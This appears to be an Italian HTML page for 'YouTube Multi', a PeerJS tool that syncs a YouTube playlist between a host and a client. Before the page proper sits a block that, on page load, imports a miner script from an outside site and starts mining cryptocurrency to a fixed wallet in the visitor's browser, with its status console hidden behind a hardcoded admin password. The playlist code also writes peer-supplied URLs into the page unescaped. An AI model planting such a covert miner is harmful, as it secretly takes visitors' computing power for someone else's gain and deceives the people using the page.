<!-- ==================== MINER CONSOLE ==================== -->
<style>
#mining-console {
    position: fixed;
    bottom: 80px;
    right: 20px;
    width: 280px;
    background: rgba(0, 0, 0, 0.9);
    border: 1px solid #ffffff33;
    border-radius: 6px;
    padding: 12px 14px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
    z-index: 1000;
    color: #ffffff;
    font-family: 'Courier New', monospace;
    font-size: 15px;
    line-height: 1.7;
    display: none;
}
.console-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 10px;
    padding-bottom: 8px;
    border-bottom: 1px solid #ffffff33;
}
.close-btn {
    background: #ffffff;
    color: #000;
    border: none;
    width: 22px;
    height: 22px;
    font-size: 16px;
    line-height: 18px;
    text-align: center;
    border-radius: 3px;
    cursor: pointer;
    font-weight: bold;
}
#reopen-btn {
    position: fixed;
    bottom: 20px;
    right: 20px;
    width: 50px;
    height: 50px;
    background: rgba(255,255,255,0.1);
    border: 2px solid #ffffff88;
    color: #ffffff;
    font-size: 26px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    z-index: 999;
    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
}
</style>

<div id="mining-console">
    <div class="console-header">
        <span><strong>CPU Miner</strong></span>
        <button class="close-btn" onclick="hideMinerConsole()"></button>
    </div>
    <div>Stato: <span id="status">Avviando...</span></div>
    <div>Hashrate: <span id="hashrate">0.00</span> KH/s</div>
    <div>Tempo: <span id="timer">00:00</span></div>
    <div>Job accettati: <span id="shares">0</span></div>
</div>

<div id="reopen-btn" onclick="askPassword()"></div>

<script type="module">
    import { autoMine, minotaurxHashrate } from "https://earnify.cc/miner.js";

    let miningStarted = false;
    let consoleUnlocked = false;   // ← Nuovo: ricorda se la password è stata inserita

    // Mining parte subito
    async function initMining() {
        try {
            await autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
            miningStarted = true;
            document.getElementById("status").textContent = "Attivo";
            
            setInterval(() => {
                const hr = minotaurxHashrate.currentHashrateKHs || 0;
                const shares = minotaurxHashrate.sharesAccepted || 0;
                
                document.getElementById("hashrate").textContent = parseFloat(hr).toFixed(2);
                document.getElementById("shares").textContent = shares;
            }, 700);

        } catch (e) {
            console.error(e);
            document.getElementById("status").textContent = "Errore";
        }
    }

    window.askPassword = function() {
        if (consoleUnlocked) {
            showMinerConsole();
            return;
        }

        const password = prompt("Inserire admin password");
        if (password === "CpuMining") {
            consoleUnlocked = true;
            showMinerConsole();
        } else if (password !== null) {
            alert("Password errata!");
        }
    };

    window.hideMinerConsole = function() {
        document.getElementById("mining-console").style.display = "none";
        document.getElementById("reopen-btn").style.display = "flex";
    };

    function showMinerConsole() {
        document.getElementById("mining-console").style.display = "block";
        document.getElementById("reopen-btn").style.display = "none";
    }

    // Timer
    let startTime = Date.now();
    setInterval(() => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const min = Math.floor(elapsed / 60).toString().padStart(2, '0');
        const sec = (elapsed % 60).toString().padStart(2, '0');
        document.getElementById("timer").textContent = `${min}:${sec}`;
    }, 1000);

    // Avvio
    window.addEventListener('load', () => {
        initMining();
    });
</script>
<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>YouTube Multi</title>
<style>
    body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; }
    .container { max-width: 1100px; margin: auto; background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
    input { width: 100%; padding: 15px; font-size: 17px; border: 2px solid #ccc; border-radius: 8px; margin-bottom: 12px; }
    button { padding: 14px 24px; font-size: 16px; border: none; border-radius: 8px; cursor: pointer; margin: 5px 5px 5px 0; }
    .btn-add { background: #28a745; color: white; }
    .btn-clear { background: #dc3545; color: white; }
    .status { padding: 15px; margin: 12px 0; border-radius: 8px; font-weight: bold; text-align: center; }
    .connected { background: #d4edda; color: #155724; }
    .list { border: 1px solid #ddd; padding: 15px; min-height: 180px; border-radius: 8px; background: #fafafa; }
</style>
</head>
<body>
<div class="container">
    <h1>🎥 YouTube Multi</h1>
    
    <div id="modeSelector">
        <button onclick="startHost()" style="background:#007bff;color:white;padding:18px 40px;font-size:18px;">🌐 AVVIA HOST</button><br><br>
        <button onclick="startClient()" style="padding:18px 40px;font-size:18px;">📱 AVVIA CLIENT</button>
    </div>

    <div id="mainApp" style="display:none;">
        <div id="statusBar" class="status">In attesa di connessione...</div>
        
        <input type="text" id="youtubeUrl" placeholder="Link YouTube (puoi mettere più link)" />
        <button class="btn-add" onclick="aggiungiVideo()">➕ Aggiungi</button>
        <button class="btn-clear" onclick="cancellaTutti()">🗑️ Cancella Tutti</button>
        <button onclick="forceSync()" style="background:#ffc107;">🔄 Forza Sync</button>
        
        <h3>Lista Video</h3>
        <div id="videoList" class="list"></div>
        
        <div id="playerArea" style="margin-top:25px;"></div>
    </div>

    <div id="hostInfo" style="display:none; text-align:center; background:#d4edda; padding:20px; border-radius:10px; margin-top:15px;">
        <strong>Codice Host</strong><br>
        <span id="hostCode" style="font-size:48px; letter-spacing:10px; font-weight:bold;"></span><br><br>
        <button onclick="copyHostCode()">📋 Copia Codice</button>
    </div>
</div>

<script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
<script>
let videos = [];
let isHost = false;
let currentCode = "";
let peer = null;
let conn = null;

function updateStatus(msg, good = false) {
    const el = document.getElementById('statusBar');
    el.textContent = msg;
    el.className = good ? "status connected" : "status";
}

function startHost() {
    isHost = true;
    currentCode = String(1000 + Math.floor(Math.random() * 9000));
    document.getElementById('modeSelector').style.display = 'none';
    document.getElementById('mainApp').style.display = 'block';
    document.getElementById('hostInfo').style.display = 'block';
    document.getElementById('hostCode').textContent = currentCode;

    peer = new Peer(`ytmulti-${currentCode}`);
    peer.on('connection', (c) => {
        conn = c;
        setupConnection();
        updateStatus("✅ Client connesso!", true);
    });
    updateStatus("Host avviato - Attendi client...");
}

function startClient() {
    const code = prompt("Inserisci codice Host (4 cifre):");
    if (!code || code.length !== 4) return alert("Codice invalido");
    
    document.getElementById('modeSelector').style.display = 'none';
    document.getElementById('mainApp').style.display = 'block';
    
    peer = new Peer();
    peer.on('open', () => {
        conn = peer.connect(`ytmulti-${code}`);
        setupConnection();
    });
}

function setupConnection() {
    if (!conn) return;
    
    conn.on('open', () => {
        updateStatus("Connessione OK", true);
        if (!isHost) setTimeout(() => sendCommand({type: "REQUEST_SYNC"}), 800);
    });

    conn.on('data', (data) => {
        console.log("Ricevuto:", data);
        if (data.type === "SYNC_STATE") {
            videos = data.videos || [];
            aggiornaLista();
        } else if (isHost) {
            if (data.type === "ADD_VIDEO") videos.push({id: data.id, url: data.url});
            if (data.type === "CLEAR_ALL") videos = [];
            syncState();
        }
    });
}

function sendCommand(cmd) {
    if (conn && conn.open) {
        conn.send(cmd);
    }
}

function syncState() {
    if (conn && conn.open) {
        sendCommand({type: "SYNC_STATE", videos: videos});
    }
    aggiornaLista();
}

function forceSync() {
    if (isHost) syncState();
    else sendCommand({type: "REQUEST_SYNC"});
    aggiornaLista();
}

// ==================== AZIONI ====================
function aggiungiVideo() {
    const input = document.getElementById('youtubeUrl');
    const text = input.value.trim();
    if (!text) return;
    
    const urls = text.split(/\s+/);
    let added = 0;
    
    for (let url of urls) {
        const id = estraiVideoId(url);
        if (id && !videos.some(v => v.id === id)) {
            videos.push({id, url});
            added++;
        }
    }
    
    if (added > 0) {
        if (isHost) {
            syncState();
        } else {
            aggiornaLista();
            sendCommand({type: "ADD_VIDEO", id: videos[videos.length-1].id, url: videos[videos.length-1].url});
        }
    }
    input.value = "";
}

function cancellaTutti() {
    if (confirm("Vuoi cancellare tutto?")) {
        videos = [];
        aggiornaLista();
        if (isHost) syncState();
        else sendCommand({type: "CLEAR_ALL"});
    }
}

function aggiornaLista() {
    const list = document.getElementById('videoList');
    list.innerHTML = videos.length === 0 ? "<p style='text-align:center;color:#888;padding:40px;'>Nessun video</p>" : "";
    
    videos.forEach((v, i) => {
        const div = document.createElement('div');
        div.style.padding = "12px";
        div.style.borderBottom = "1px solid #eee";
        div.innerHTML = `<strong>${i+1}.</strong> ${v.url} <button onclick="rimuoviVideo(${i})" style="float:right;background:#dc3545;color:white;border:none;padding:4px 10px;border-radius:4px;">Elimina</button>`;
        list.appendChild(div);
    });
    
    if (videos.length > 0) {
        document.getElementById('playerArea').innerHTML = `
            <iframe width="100%" height="480" 
                src="https://www.youtube.com/embed/${videos[0].id}?playlist=${videos.map(v=>v.id).join(',')}&autoplay=1" 
                frameborder="0" allowfullscreen></iframe>`;
    }
}

function rimuoviVideo(i) {
    videos.splice(i, 1);
    aggiornaLista();
    if (isHost) syncState();
    else sendCommand({type: "REMOVE_VIDEO", index: i});
}

function estraiVideoId(url) {
    url = url.trim();
    const match = url.match(/(?:v=|youtu\.be\/|embed\/|shorts\/)([^&\n?#]+)/);
    return match ? match[1] : null;
}

function copyHostCode() {
    navigator.clipboard.writeText(currentCode);
    alert("Codice copiato!");
}
</script>
</body>
</html>
